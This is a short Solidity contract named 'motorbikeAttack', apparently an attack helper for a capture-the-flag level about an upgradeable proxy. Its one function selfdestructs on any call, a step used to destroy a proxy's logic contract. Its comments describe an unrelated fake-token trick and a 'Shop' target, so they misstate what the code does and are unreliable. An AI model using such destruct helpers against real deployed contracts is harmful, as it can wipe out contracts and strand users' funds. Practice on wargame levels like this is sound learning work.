// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * this contract is a fake token, with the 2 functions called by the target
 * will return a balanceOf() superior to the amount traded, 
 * then will not transfer anything (fake transferFrom function).
 */
contract motorbikeAttack {

    // address payable public target;
    // Shop public immutable target;
    constructor() {
    }

  // fake balanceOf function, with same declaration as in IERC20 token contract
  function self_destruct() external {
    selfdestruct(payable(msg.sender));
  }
}
